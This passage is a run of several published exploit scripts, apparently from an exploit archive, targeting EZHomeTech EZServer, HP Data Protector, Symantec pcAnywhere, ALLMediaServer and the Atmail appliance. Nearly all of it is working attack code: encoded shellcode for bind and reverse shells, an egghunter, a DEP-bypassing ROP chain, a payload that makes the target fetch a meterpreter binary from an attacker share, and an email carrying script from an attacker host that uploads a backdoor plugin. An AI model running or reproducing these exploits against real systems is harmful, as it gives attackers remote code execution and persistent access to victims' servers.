"\x59\x4d\x30\x50\x4e\x56\x36\x51\x56\x4b\x4f\x36\x50\x43\x58"
"\x54\x48\x4c\x47\x55\x4d\x33\x50\x4b\x4f\x4e\x35\x4f\x4b\x4a"
"\x50\x58\x35\x4f\x52\x36\x36\x53\x58\x49\x36\x4d\x45\x4f\x4d"
"\x4d\x4d\x4b\x4f\x58\x55\x47\x4c\x43\x36\x53\x4c\x35\x5a\x4d"
"\x50\x4b\x4b\x4d\x30\x54\x35\x55\x55\x4f\x4b\x57\x37\x35\x43"
"\x32\x52\x52\x4f\x43\x5a\x45\x50\x51\x43\x4b\x4f\x4e\x35\x41"
"\x41")

junk1 = "\x41" * 5025
junk2 = "\x42" * 5029
junk3 = "\x43" * 10000
buff = "w00tw00t"
buff+= shellcode
buff+= "\x90" * 100
buff+= "\xeb\x08\x90\x90"
buff+= struct.pack('<L', 0x10212779)
buff+= "\x90" * 16
buff+= hunt
buff+= "\x44" * 5000

def winxp():
	try:
		host = raw_input("[!] Target IP: ")
		print "[!] Connecting to %s on port 8000" %host
		s = socket(AF_INET, SOCK_STREAM)
		s.connect((host,8000))
		print "[+] Launching attack.."
		print "[+] Sending payload.."
		payload = junk1+buff
		s.send (payload)
		s.close()
		print "[+] Wait for hunter.."
		sleep(5)
		print "[+] Connecting to target shell!"
		sleep(2)
		system("nc -v %s 4444" %host)
	except:
		print "[x] Could not connect to the server x_x"
		sys.exit()
		
def win2k3():
	try:
		host = raw_input("[!] Target IP: ")
		print "[!] Connecting to %s on port 8000" %host
		s = socket(AF_INET, SOCK_STREAM)
		s.connect((host,8000))
		print "[+] Launching attack.."
		print "[+] Sending payload.."
		payload = junk2+buff
		s.send(payload)
		s.close()
		print "[+] Wait for hunter.."
		sleep(5)
		print "[+] Connecting to target shell!"
		sleep(1)
		system("nc -v %s 4444" %host)
	except:
		print "[x] Could not connect to the server x_x"
		sys.exit()
		
def crash():
	try:
		host = raw_input("[!] Target IP: ")
		print "[!] Connecting to %s on port 8000" %host
		s = socket(AF_INET, SOCK_STREAM)
		s.connect((host,8000))
		print "[+] Launching attack.."
		print "[+] Sending payload.."
		payload = junk3
		s.send (payload)
		s.close()
		print "[+] Server should be crashed! Check your debugger"
	except:
		print "[x] Could not connect to the server x_x"
		sys.exit()

print "#################################################################"
print "#     EZHomeTech EZServer <= 6.4.0.17 Stack Overflow Exploit	#"
print "#              by modpr0be[at]spentera | @modpr0be		#"
print "#           thanks to: otoy, cikumel, y0k | @spentera		#"
print "================================================================="
print "\t1.Windows XP SP3 (DEP OptIn) bindshell on port 4444"
print "\t2.Windows 2003 SP2 (DEP OptIn) bindshell on port 4444"
print "\t3.Crash only (debug)\n"

a = 0
while a < 3:
	a = a + 1
	op = input ("[!] Choose your target OS: ")
	if op == 1:
		winxp()
		sys.exit()
	elif op == 2:
		win2k3()
		sys.exit()
	elif op == 3:
		crash()
		sys.exit()
	else:
		print "[-] Oh plz.. pick the right one :)\r\n"
#!/usr/bin/env python

# Exploit Title: HP Data Protector Client EXEC_CMD Remote Code Execution Vulnerability
# Date: 2012-12-06
# Exploit Author: Ben Turner
# Vendor Homepage: www.hp.com
# Version: 6.11 & 6.20
# Tested on: Windows 2003 Server SP2 en
# CVE: CVE-2011-0922
# Notes: ZDI-11-056
# Reference: http://www.zerodayinitiative.com/advisories/ZDI-11-056/
# Reference: http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02781143


import socket
import sys
import binascii

if len(sys.argv) != 4:
    print ""
    print "\033[0;31mUsage: ./hp_protector.py <Target IP> <Port> <Reverse IP> \033[0m" 
    print ""
    print "\033[0;32mMake sure you create a meterpreter payload and a share with the following \\\\<Reverse IP>\\Omniback\\i386\\installservice.exe\033[0m" 
    print "\033[0;32mAlso make sure the SYSTEM account on windows can access your share, this is not always trivial\033[0m"
    print ""
    sys.exit(1)
host = sys.argv[1]
port = int(sys.argv[2])
lhost = sys.argv[3]

# Create a Share with the following:
# Ensure you can access that share with the SYSTEM account on a machine - 
#
# \\ipaddress\Omniback\i386\installservice.exe


b = ''

for char in lhost:
	a = "\x00"+char
	b = b + a

#print b


payload = ("\x00\x00\x01\xbe\xff\xfe\x32\x00\x00\x00\x20"
+ b + 
"\x00\x00\x00\x20\x00\x30\x00"
"\x00\x00\x20\x00\x53\x00\x59\x00\x53\x00\x54\x00\x45\x00\x4d\x00"
"\x00\x00\x20\x00\x4e\x00\x54\x00\x20\x00\x41\x00\x55\x00\x54\x00"
"\x48\x00\x4f\x00\x52\x00\x49\x00\x54\x00\x59\x00\x00\x00\x20\x00"
"\x43\x00\x00\x00\x20\x00\x32\x00\x36\x00\x00\x00\x20\x00\x5c\x00"
"\x5c"
+ b +
"\x00\x5c\x00\x4f\x00\x6d\x00\x6e\x00\x69\x00\x62\x00"
"\x61\x00\x63\x00\x6b\x00\x5c\x00\x69\x00\x33\x00\x38\x00\x36\x00"
"\x5c\x00\x69\x00\x6e\x00\x73\x00\x74\x00\x61\x00\x6c\x00\x6c\x00"
"\x73\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00\x2e\x00"
"\x65\x00\x78\x00\x65\x00\x20\x00\x2d\x00\x73\x00\x6f\x00\x75\x00"
"\x72\x00\x63\x00\x65\x00\x20\x4f\x00\x6d\x00\x6e\x00\x69\x00\x62"
"\x00\x61\x00\x63\x00\x6b\x00\x20\x00\x5c\x00\x5c"
+ b +
"\x5c\x00\x5c\x00\x4f\x00"
"\x6d\x00\x6e\x00\x69\x00\x62\x00\x61\x00\x63\x00\x6b\x00\x5c\x00"
"\x69\x00\x33\x00\x38\x00\x36\x00\x5c\x00\x69\x00\x6e\x00\x73\x00"
"\x74\x00\x61\x00\x6c\x00\x6c\x00\x73\x00\x65\x00\x72\x00\x76\x00"
"\x69\x00\x63\x00\x65\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x20\x00"
"\x2d\x00\x73\x00\x6f\x00\x75\x00\x72\x00\x63\x00\x65\x00\x20\x00"
"\x5c\x00\x5c"
+ b +
"\x00\x5c\x00\x4f\x00\x6d\x00\x6e\x00\x69\x00\x62\x00\x61\x00\x63"
"\x00\x6b\x00\x20\x00\x00\x00\x00\x00\x00\x00\x02\x54"
"\xff\xfe\x32\x00\x36\x00\x00\x00\x20\x00\x5b\x00\x30\x00\x5d\x00"
"\x41\x00\x44\x00\x44\x00\x2f\x00\x55\x00\x50\x00\x47\x00\x52\x00"
"\x41\x00\x44\x00\x45\x00\x0a\x00\x5c\x00\x5c"
+ b +
"\x00\x5c\x00\x4f\x00\x6d\x00\x6e\x00\x69\x00\x62\x00\x61\x00\x63"
"\x00\x6b\x00\x5c\x00\x69\x00\x33\x00\x38\x00\x36\x00")

print payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print "Sending payload"
s.send(payload)
while 1:
        data = s.recv(4096)
        if data:
                print data
        else:
                break
s.close()
#!/usr/bin/python

# Exploit Title: Symantec PcAnywhere login and password field buffer overflow
# Date: 2012.06.27
# Author: S2 Crew [Hungary]
# Software Link: symantec.com
# Version: 12.5.0
# Tested on: Windows XP SP2
# CVE: CVE-2011-3478 
 
#EDB Note: Needs adjustment but there is a crash

# Code :
import socket
import time
import struct
import string
import sys

shell = (
"\xda\xda\xbb\x9e\x7f\xfb\x04\xd9\x74\x24\xf4\x58\x2b\xc9"
"\xb1\x56\x31\x58\x18\x03\x58\x18\x83\xc0\x9a\x9d\x0e\xf8"
"\x4a\xe8\xf1\x01\x8a\x8b\x78\xe4\xbb\x99\x1f\x6c\xe9\x2d"
"\x6b\x20\x01\xc5\x39\xd1\x92\xab\x95\xd6\x13\x01\xc0\xd9"
"\xa4\xa7\xcc\xb6\x66\xa9\xb0\xc4\xba\x09\x88\x06\xcf\x48"
"\xcd\x7b\x3f\x18\x86\xf0\xed\x8d\xa3\x45\x2d\xaf\x63\xc2"
"\x0d\xd7\x06\x15\xf9\x6d\x08\x46\x51\xf9\x42\x7e\xda\xa5"
"\x72\x7f\x0f\xb6\x4f\x36\x24\x0d\x3b\xc9\xec\x5f\xc4\xfb"
"\xd0\x0c\xfb\x33\xdd\x4d\x3b\xf3\x3d\x38\x37\x07\xc0\x3b"
"\x8c\x75\x1e\xc9\x11\xdd\xd5\x69\xf2\xdf\x3a\xef\x71\xd3"
"\xf7\x7b\xdd\xf0\x06\xaf\x55\x0c\x83\x4e\xba\x84\xd7\x74"
"\x1e\xcc\x8c\x15\x07\xa8\x63\x29\x57\x14\xdc\x8f\x13\xb7"
"\x09\xa9\x79\xd0\xfe\x84\x81\x20\x68\x9e\xf2\x12\x37\x34"
"\x9d\x1e\xb0\x92\x5a\x60\xeb\x63\xf4\x9f\x13\x94\xdc\x5b"
"\x47\xc4\x76\x4d\xe7\x8f\x86\x72\x32\x1f\xd7\xdc\xec\xe0"
"\x87\x9c\x5c\x89\xcd\x12\x83\xa9\xed\xf8\xb2\xed\x23\xd8"
"\x97\x99\x41\xde\x06\x06\xcf\x38\x42\xa6\x99\x93\xfa\x04"
"\xfe\x2b\x9d\x77\xd4\x07\x36\xe0\x60\x4e\x80\x0f\x71\x44"
"\xa3\xbc\xd9\x0f\x37\xaf\xdd\x2e\x48\xfa\x75\x38\x71\x6d"
"\x0f\x54\x30\x0f\x10\x7d\xa2\xac\x83\x1a\x32\xba\xbf\xb4"
"\x65\xeb\x0e\xcd\xe3\x01\x28\x67\x11\xd8\xac\x40\x91\x07"
"\x0d\x4e\x18\xc5\x29\x74\x0a\x13\xb1\x30\x7e\xcb\xe4\xee"
"\x28\xad\x5e\x41\x82\x67\x0c\x0b\x42\xf1\x7e\x8c\x14\xfe"
"\xaa\x7a\xf8\x4f\x03\x3b\x07\x7f\xc3\xcb\x70\x9d\x73\x33"
"\xab\x25\x83\x7e\xf1\x0c\x0c\x27\x60\x0d\x51\xd8\x5f\x52"
"\x6c\x5b\x55\x2b\x8b\x43\x1c\x2e\xd7\xc3\xcd\x42\x48\xa6"
"\xf1\xf1\x69\xe3"
)
init1 = (
"\x00\x00\x00\x00" # kezdeti handshake
)

init2 = (
"\x0d\x06\xfe" # Enter username uzenet koveti (NTdialog)
)

init3 = (
"A" * 100 #+ "\r" #username
)

readable_xp_sp2 = struct.pack('<L',0x023E5AD0)
call_esi = struct.pack('<L',0x67f7aac4)
jmp = struct.pack('<L',0x414112EB)

init4 = (
"B" * 1282 + jmp + readable_xp_sp2 + "DDDD" +call_esi + "AAAA" + shell + "E" * (4000 - 1286 - 12 - len(shell))
)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('172.16.29.133',5631)) # hardcoded IP address

print "init packet..."
s.send(init1) # send the data
time.sleep(5)
data = s.recv(1024)

print "handshake packet..."
s.send(init2) # send the data
time.sleep(5)
data = s.recv(1024)

print "username packet..."
s.send(init3) # send the data
time.sleep(5)
#data = s.recv(1024)

print "password packet..."
s.send(init4) # send the data
s.close()

# Exploit Title: seh exploit, BOF 
# Date: 04/07/2012
# Exploit Author: motaz reda 
# my E-mail:  motazkhodair@gmail.com
# Software Link: http://allmediaserver.org/
# Version: ALLMediaServer 0.8
# Tested On: Windows 7 ultimate
################################################

#!/usr/bin/python

import sys, socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((sys.argv[1], 888))

buffer = "A" * 1072

buffer += "\xeb\x06\x90\x90"   #NSEH  jmp short 6

buffer += "\xca\x24\xec\x65"   # SEH  POP POP RETN

# msfpayload windows/shell_reverse_tcp 
# you can replace the shellcode with any shellcode u want

buffer += ("\xd9\xc8\xd9\x74\x24\xf4\xb8\xa6\xaa\xb6\xad\x5b\x2b\xc9\xb1"
"\x4f\x83\xeb\xfc\x31\x43\x15\x03\x43\x15\x44\x5f\x4a\x45\x01"
"\xa0\xb3\x96\x71\x28\x56\xa7\xa3\x4e\x12\x9a\x73\x04\x76\x17"
"\xf8\x48\x63\xac\x8c\x44\x84\x05\x3a\xb3\xab\x96\x8b\x7b\x67"
"\x54\x8a\x07\x7a\x89\x6c\x39\xb5\xdc\x6d\x7e\xa8\x2f\x3f\xd7"
"\xa6\x82\xaf\x5c\xfa\x1e\xce\xb2\x70\x1e\xa8\xb7\x47\xeb\x02"
"\xb9\x97\x44\x19\xf1\x0f\xee\x45\x22\x31\x23\x96\x1e\x78\x48"
"\x6c\xd4\x7b\x98\xbd\x15\x4a\xe4\x11\x28\x62\xe9\x68\x6c\x45"
"\x12\x1f\x86\xb5\xaf\x27\x5d\xc7\x6b\xa2\x40\x6f\xff\x14\xa1"
"\x91\x2c\xc2\x22\x9d\x99\x81\x6d\x82\x1c\x46\x06\xbe\x95\x69"
"\xc9\x36\xed\x4d\xcd\x13\xb5\xec\x54\xfe\x18\x11\x86\xa6\xc5"
"\xb7\xcc\x45\x11\xc1\x8e\x01\xd6\xff\x30\xd2\x70\x88\x43\xe0"
"\xdf\x22\xcc\x48\x97\xec\x0b\xae\x82\x48\x83\x51\x2d\xa8\x8d"
"\x95\x79\xf8\xa5\x3c\x02\x93\x35\xc0\xd7\x33\x66\x6e\x88\xf3"
"\xd6\xce\x78\x9b\x3c\xc1\xa7\xbb\x3e\x0b\xde\xfc\xa9\x74\x49"
"\x03\x3e\x1d\x88\x03\x2f\x81\x05\xe5\x25\x29\x40\xbe\xd1\xd0"
"\xc9\x34\x43\x1c\xc4\xdc\xe0\x8f\x83\x1c\x6e\xac\x1b\x4b\x27"
"\x02\x52\x19\xd5\x3d\xcc\x3f\x24\xdb\x37\xfb\xf3\x18\xb9\x02"
"\x71\x24\x9d\x14\x4f\xa5\x99\x40\x1f\xf0\x77\x3e\xd9\xaa\x39"
"\xe8\xb3\x01\x90\x7c\x45\x6a\x23\xfa\x4a\xa7\xd5\xe2\xfb\x1e"
"\xa0\x1d\x33\xf7\x24\x66\x29\x67\xca\xbd\xe9\x97\x81\x9f\x58"
"\x30\x4c\x4a\xd9\x5d\x6f\xa1\x1e\x58\xec\x43\xdf\x9f\xec\x26"
"\xda\xe4\xaa\xdb\x96\x75\x5f\xdb\x05\x75\x4a")

s.send(buffer)

s.close()

### Exploit-DB note:
### This affects AllMediaSErver 0.94 as well.

# Exploit-DB Note:
# Here's a ROP chain that will work on Windows 7 Pro Eng DEP AlwaysOn
# DEP/ASLR bypass with bind shell on port 4444
buffer = "\x41" * 984
buffer+= "\xe6\x30\x46\x00"	# Second ADD esp for stack adjustment
				# add esp,90 | pop esi | pop ebx | retn ~ MediaServer.exe
buffer+= "\x41" * 88
# Step over SEH
stackAdjust = "\x9e\x6c\x42\x00"	# add esp,800 | pop ebx | retn ~ MediaServer.exe
					# Returns to Second ADD ESP
stackAdjust+= "\x42\x42\x42\x42" * 15	# Padding

# VirtualProtect into ESI
rop = "\x26\xfa\xf6\x65"	# pop eax | retn	 		~ avcodec-53.dll
rop+= "\xe0\xe4\x1e\x67"	# &kernel32.VirtualProtect		~
rop+= "\x54\xcd\xc6\x6a"	# mov eax,dword ptr ds:[eax] | retn	~
rop+= "\x04\xef\x2e\x66"	# xchg eax,esi | retn			~ avcodec-53.dll
				# Puts Kernel31.VirtualProtect
# lpAddress param into EBP
rop+= "\xb3\x14\xb8\x68"        # pop ebp | retn                       	~
rop+= "\x07\x5d\x0c\x66"	# ROP jmp esp | ???			~ avcodec-53.dll

# dwSize into EBX
rop+= "\x26\xfa\xf6\x65"        # pop eax | retn                        ~ avcodec-53.dll
rop+= "\xff\xfd\xff\xff"	# Will negate to 0x201
rop+= "\xbe\x13\x6e\x66"        # neg eax | retn
rop+= "\x2b\xe2\xf4\x65"	# xchg eax,ebx | retn			~ avcodec-53.dll

# flNewProtect 0x40 into EDX
rop+= "\x26\xfa\xf6\x65"        # pop eax | retn                       	~ avcodec-53.dll
rop+= "\xc0\xff\xff\xff"	# Will negate to 0x40
rop+= "\xbe\x13\x6e\x66"        # neg eax | retn                        ~ avcodec-53.dll
rop+= "\x46\x08\x53\x66"	# xchg eax,edx | retn			~ avcoded-53.dll

# lpflOldProtect into ECX
rop+= "\x26\xfa\xf6\x65"        # pop eax | retn                       	~ avcodec-53.dll
rop+= "\x69\xef\x5f\x00"	# writeable address			~ avformat-53.dll
rop+= "\xeb\x9b\x74\x66"	# xchg eax,ecx | retn			~ avcodec-53.dll

# RETN into EDI
rop+= "\x84\xe6\x75\x66"	# pop edi | retn
rop+= "\x6d\x9b\xb2\x6a"	# retn ROP

# Nops in EAX
rop+= "\x26\xfa\xf6\x65"        # pop eax | retn                       	~ avcodec-53.dll
rop+= "\x90\x90\x90\x90"

# PushAD
rop+= "\x3a\x18\x75\x66"	# pushad | rent				~ avodec-53.dll

rop+= "\x90\x90\x90\x90"


shellcode =(
"\xba\x4b\xdb\xfb\xca\xdb\xc2\xd9\x74\x24\xf4\x5d\x2b\xc9"
"\xb1\x56\x31\x55\x13\x03\x55\x13\x83\xed\xb7\x39\x0e\x36"
"\xaf\x37\xf1\xc7\x2f\x28\x7b\x22\x1e\x7a\x1f\x26\x32\x4a"
"\x6b\x6a\xbe\x21\x39\x9f\x35\x47\x96\x90\xfe\xe2\xc0\x9f"
"\xff\xc2\xcc\x4c\xc3\x45\xb1\x8e\x17\xa6\x88\x40\x6a\xa7"
"\xcd\xbd\x84\xf5\x86\xca\x36\xea\xa3\x8f\x8a\x0b\x64\x84"
"\xb2\x73\x01\x5b\x46\xce\x08\x8c\xf6\x45\x42\x34\x7d\x01"
"\x73\x45\x52\x51\x4f\x0c\xdf\xa2\x3b\x8f\x09\xfb\xc4\xa1"
"\x75\x50\xfb\x0d\x78\xa8\x3b\xa9\x62\xdf\x37\xc9\x1f\xd8"
"\x83\xb3\xfb\x6d\x16\x13\x88\xd6\xf2\xa5\x5d\x80\x71\xa9"
"\x2a\xc6\xde\xae\xad\x0b\x55\xca\x26\xaa\xba\x5a\x7c\x89"
"\x1e\x06\x27\xb0\x07\xe2\x86\xcd\x58\x4a\x77\x68\x12\x79"
"\x6c\x0a\x79\x16\x41\x21\x82\xe6\xcd\x32\xf1\xd4\x52\xe9"
"\x9d\x54\x1b\x37\x59\x9a\x36\x8f\xf5\x65\xb8\xf0\xdc\xa1"
"\xec\xa0\x76\x03\x8c\x2a\x87\xac\x59\xfc\xd7\x02\x31\xbd"
"\x87\xe2\xe1\x55\xc2\xec\xde\x46\xed\x26\x69\x41\x23\x12"
"\x3a\x26\x46\xa4\xad\xea\xcf\x42\xa7\x02\x86\xdd\x5f\xe1"
"\xfd\xd5\xf8\x1a\xd4\x49\x51\x8d\x60\x84\x65\xb2\x70\x82"
"\xc6\x1f\xd8\x45\x9c\x73\xdd\x74\xa3\x59\x75\xfe\x9c\x0a"
"\x0f\x6e\x6f\xaa\x10\xbb\x07\x4f\x82\x20\xd7\x06\xbf\xfe"
"\x80\x4f\x71\xf7\x44\x62\x28\xa1\x7a\x7f\xac\x8a\x3e\xa4"
"\x0d\x14\xbf\x29\x29\x32\xaf\xf7\xb2\x7e\x9b\xa7\xe4\x28"
"\x75\x0e\x5f\x9b\x2f\xd8\x0c\x75\xa7\x9d\x7e\x46\xb1\xa1"
"\xaa\x30\x5d\x13\x03\x05\x62\x9c\xc3\x81\x1b\xc0\x73\x6d"
"\xf6\x40\x83\x24\x5a\xe0\x0c\xe1\x0f\xb0\x50\x12\xfa\xf7"
"\x6c\x91\x0e\x88\x8a\x89\x7b\x8d\xd7\x0d\x90\xff\x48\xf8"
"\x96\xac\x69\x29")

payload = buffer + stackAdjust + rop + shellcode
rest = 1765 - len(payload)
exploit = payload + "\xCC" * rest
# Send exploit to target's port 888

######################################################################################
# Exploit Title: Atmail Email Server Appliance 6.4 Remote Code Execution
# Date: Jul 21 2012
# Author: muts
# Version: Atmail Email Server 6.4
#
# By sending an email to a user with the Atmail administrative interface open, we
# can call a remote JavaScript file that will initiate the installation of a 
# specially crafted plugin file via CSRF, enabling remote code execution on the 
# Atmail server.
#
######################################################################################

Timeline:

29 May 2012: Vulnerability reported to CERT
30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
21 Jul 2012: Public Disclosure

#!/usr/bin/python
import smtplib, urllib2, sys

def sendMail(dstemail, frmemail, smtpsrv, username, password):
	msg  = "From: admin@offsec.local\n"
	msg += "To: admin@offsec.local\n"
	msg += 'Date: <script src="http://172.16.164.1/~awae/atmail-rce.js"></script>\n'
	msg += "Subject: You haz been pwnd\n"
	msg += "Content-type: text/html\n\n"
	msg += "Oh noez, you been had."
	msg += '\r\n\r\n'
	server = smtplib.SMTP(smtpsrv)
	server.login(username,password)
	try:
		server.sendmail(frmemail, dstemail, msg)
	except Exception, e:
		print "[-] Failed to send email:"
		print "[*] " + str(e)
	server.quit()

username = "admin@offsec.local"
password = "123456"
dstemail = "admin@offsec.local"
frmemail = "admin@offsec.local"
smtpsrv  = "172.16.164.147"

if not (dstemail and frmemail and smtpsrv):
   sys.exit()

sendMail(dstemail, frmemail, smtpsrv, username, password)


#############################################################################################################


function timeMsg()
{
	var t=setTimeout("getShell()",5000);
}

function getShell()
{
	var b64url ="http://172.16.164.130/index.php/admin/plugins/add/file/QmFja2Rvb3IudGd6";
 	xhr = new XMLHttpRequest();
	xhr.open("GET", b64url, true);
	xhr.send(null);

}
function fileUpload(url, fileData, fileName, nameVar, ctype) {

   var fileSize = fileData.length,
   boundary = "OWNEDBYOFFSEC",
   xhr = new XMLHttpRequest();
   xhr.open("POST", url, true);
   //  MIME POST request.
   xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
   xhr.setRequestHeader("Content-Length", fileSize);
   var body = "--" + boundary + "\r\n";
   body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
   body += "Content-Type: " + ctype + "\r\n\r\n";
   body += fileData + "\r\n";
   body += "--" + boundary + "--";

   //xhr.send(body);
   xhr.sendAsBinary(body);
   return true;
}

var nameVar  = "newPlugin";
var fileName = "Backdoor.tgz";
var url      = "http://172.16.164.130/index.php/admin/plugins/preinstall";
var ctype    = "application/x-gzip";
//var ctype    = "application/octet-stream";
//var data     = "\x44\x41\x42\x43\x44";
var data     = '\x1F\x8B\x08\x00\x44\x7A\x91\x4F\x00\x03\xED\x59\xED\x72\xDB\xC6' +
'\x15\x55\x3B\xD3\xE9\x88\xFF\xDB\xDF\x1B\x8D\xA6\x22\x27\x24\x48' +
'\xF0\xD3\x96\x2A\x27\x34\x2D\xD9\x9C\xC8\x92\x86\x94\xE2\x7A\x9A' +
'\x0E\x67\x05\x2C\x49\x8C\x40\x00\xC6\x02\xA2\x99\xD4\xEF\xD1\xD7' +
'\xE8\x33\xF5\x45\x7A\xEE\x2E\x40\x91\x16\x4D\x53\x89\x46\x69\x63' +
'\xDC\x89\x4C\x12\xB8\x7B\xF7\xE2\xDC\xAF\xB3\x88\x51\x36\x06\x67' +
'\xC3\xA1\xF0\xA4\x73\x23\xFA\xC2\x8A\x43\x27\x9A\x6D\x3D\xAC\x54' +
'\x2A\x95\x56\xA3\xC1\xD4\x67\x53\x7F\x56\xAA\x75\xFD\x49\x52\xAB' +
'\xD7\x98\x69\xB6\xEA\xF5\x6A\xAB\x61\x56\x4C\x56\x31\x1B\x66\xB3' +
'\xB5\xC5\x2A\x0F\xEC\xC7\x4A\x89\x65\xC4\x43\xB8\x32\x89\x23\xB9' +
'\x4E\x0F\x6A\xC3\xE1\x9A\xFB\xFA\x51\xD8\xFC\xF3\xFF\x45\xFE\xF0' +
'\xE7\x3F\x6E\xFD\x7E\x6B\xEB\x35\xB7\xD8\x59\x9F\xFD\x8D\x25\x42' +
'\xD7\xB6\xB6\xF1\x57\xC5\xDF\xBF\xF1\x47\xBF\xFF\xB3\x99\xC9\xF6' +
'\xC5\x45\x2F\xF9\x4A\x2B\xFE\x85\xBF\xEF\x3E\x52\xF9\xDD\xED\xF5' +
'\x3F\x59\xFE\xC4\xE0\x41\xE0\x0A\xE3\x5D\xCC\x43\xEE\x45\x8E\x27' +
'\xB6\xDE\x95\x81\xA2\x79\x50\x1F\x3E\x35\x1B\x95\xE6\xD3\x83\xFE' +
'\xF5\x2C\x10\x07\xB5\x17\x4F\x6B\x4F\xDB\x95\x4E\xA9\xF2\xE2\x69' +
'\xA7\x54\x6F\x77\x9E\x97\x9E\x3C\x7D\xF2\xBC\x74\xD4\x79\x7E\x7C' +
'\xDC\x32\x6B\x95\xBA\x79\xF4\x4F\xB2\x27\x49\x5D\xFF\xFB\x00\x18' +
'\xFD\x86\xE5\x4E\xED\x97\x1F\x7E\x8F\xCF\xD5\x3F\xD5\xCB\x72\xFD' +
'\xD7\x9B\x54\xFF\x8D\x87\x77\xE5\xAE\x7C\xE1\xF5\x7F\x37\xFE\xC6' +
'\xE0\x39\xB7\xAE\x6D\xDF\x0F\x1F\x6A\x8F\x7B\xF4\xFF\x7A\xB3\x45' +
'\xF1\x6F\x36\x5A\x66\xD6\xFF\x1F\x45\xB2\xFE\xFF\x45\xCB\xDD\xFA' +
'\x4F\xAB\xFF\xE1\x06\xC1\x3D\xFA\x7F\x5A\xFF\xF5\x6A\x33\xEB\xFF' +
'\x8F\x21\x6B\xE2\x6F\x0C\x1C\xCF\x72\x63\x5B\xAC\xC5\x65\x03\xB9' +
'\x4F\xFF\x6F\x55\x6A\xAC\x52\xAD\xD4\x5A\xB5\xAC\xFF\x3F\x8A\x64' +
'\xFD\xFF\x8B\x96\x35\xF5\x9F\x56\xFF\x2F\x1E\x04\xF7\xE9\xFF\x49' +
'\xFD\x57\x6B\x95\xAC\xFF\x3F\x86\xAC\xED\xFF\xE7\x6E\x3C\x72\x3C' +
'\x23\x18\x07\xBF\x68\x0F\xE0\xD1\xAC\xD7\x37\x7B\xFF\x53\x69\xA8' +
'\xF8\x37\x2B\x8D\xAC\xFF\x3F\x8A\x64\xFD\xFF\x8B\x96\x35\xF5\xFF' +
'\x40\xD5\xFF\xD9\xFA\x37\x1B\xD5\xD6\xC7\xF5\x5F\x6B\x65\xF5\xFF' +
'\x28\xF2\xD7\x6F\x10\xDF\x9C\xE5\x72\x29\xD9\x9D\x5C\x98\xBF\x09' +
'\x4A\x26\x01\x13\xEF\x23\xE1\xD9\x92\xB5\xA3\x09\x77\xDC\x41\xC7' +
'\xF7\xA2\xD0\x77\x5D\x91\x2A\xE4\x7E\xCA\x6D\x07\xA1\x1F\x09\x2B' +
'\x12\x36\xDB\x1D\x04\xEA\xEA\x71\xEC\xBA\xA7\x7C\x22\xB6\xB7\x0F' +
'\xD9\x5E\x6A\x72\xEF\x60\x95\x6A\xC7\x9F\x04\xDC\x9B\x29\xCD\x3B' +
'\xEE\xAC\x5E\xD2\x8E\xA3\xB1\x1F\x2E\xAF\x60\xE9\x12\xE6\x78\x43' +
'\xFF\x5B\x3F\xBD\x5E\x92\xC9\x75\x03\x4D\xE2\x53\x1E\x04\xB3\xD0' +
'\x19\x8D\x23\x65\x91\xB2\x82\x96\x63\xDD\xA7\x97\x5C\x86\xEE\xB6' +
'\xD2\x9E\x4E\xA7\xC6\x7D\xF6\x3A\xC5\x05\xA9\x97\xAE\x56\xF8\x5E' +
'\x84\xD2\xF1\x3D\xA5\x51\x31\x2A\x86\xB9\x5A\xED\xB5\x6F\xC7\xAE' +
'\x86\x97\xE2\xB2\x06\x5A\xFD\x54\x4D\xC3\x34\x9A\x8C\xFE\x6D\x91' +
'\x2E\xB4\xE3\x2B\xD7\xB1\xD8\x30\xF6\xAC\x08\xFB\xB1\xC1\xC0\xF2' +
'\x3D\x19\x85\xB1\x15\xE5\x0B\xB9\x6D\x44\x75\x3B\xE0\xA1\xF0\xA2' +
'\xFD\xFD\xA5\x5B\x58\xBC\xBD\x1B\x8D\x1D\x59\x7A\x96\xEC\xF2\x42' +
'\x48\x2B\x74\x02\x65\xE5\x90\xED\xBC\xE2\xA1\x6D\xF9\x36\xDC\x40' +
'\x9A\x95\x26\xBE\x77\x2D\x66\x2C\x14\x37\x78\x2E\xC1\xE4\x58\xB8' +
'\x2E\x22\x24\x1D\x5B\x7C\xB5\x03\x5B\x1F\x56\xF9\x22\x45\x14\x07' +
'\xA9\x17\x6A\xC9\x40\xBC\x17\x56\x7E\x0F\x16\x59\x39\x96\x61\xD9' +
'\xF5\x2D\xEE\x96\xB9\xCA\xC9\xF2\x54\x5C\xA9\x4F\x9A\x28\x8E\xC5' +
'\xC9\x44\x79\xA2\xF0\x91\x65\x75\x43\xFB\x29\xCB\x9B\x30\x5F\x72' +
'\x3A\xF1\xB6\xA4\xB6\xA6\x6E\xC8\x9E\xB1\xB2\x2D\x6E\xCA\x1E\xD2' +
'\x9A\x55\x9F\xDD\x7E\xFF\xCB\x1E\x01\xF2\x61\x3B\xF7\x21\xF7\x6B' +
'\x97\xF5\xC6\xB2\x09\x0A\xC6\x60\x25\x0E\x1B\xEF\xB1\x39\xFF\xAB' +
'\xB7\xEA\xB5\x26\xFA\x7F\xBD\x41\xEF\x7F\xB2\xFE\xFF\x08\x92\xF1' +
'\xBF\x2F\x5A\x7E\x76\x17\xBC\xC7\x1E\xEB\xEB\xDF\xAC\x36\x9A\xAD' +
'\x8F\xEB\xBF\x56\xAD\x67\xF5\xFF\x18\xA2\xF9\x5F\xB9\xCC\xEE\x04' +
'\x99\x95\x58\x9B\xF5\x92\x51\xDD\xD7\xA3\x7A\x82\x2A\x9D\x80\x06' +
'\xA8\xB1\x8A\xC9\xCD\xCE\x5F\x9D\xD3\xE2\x39\x69\x62\xF9\x4E\x81' +
'\x55\x11\x67\x16\x40\x4D\xC8\x48\x8F\xFC\x6F\x97\x7E\x19\x9E\x88' +
'\xB0\x8A\x16\x5E\x80\x3B\xB0\xC8\xF7\x5D\x36\xE1\x33\x76\x25\x58' +
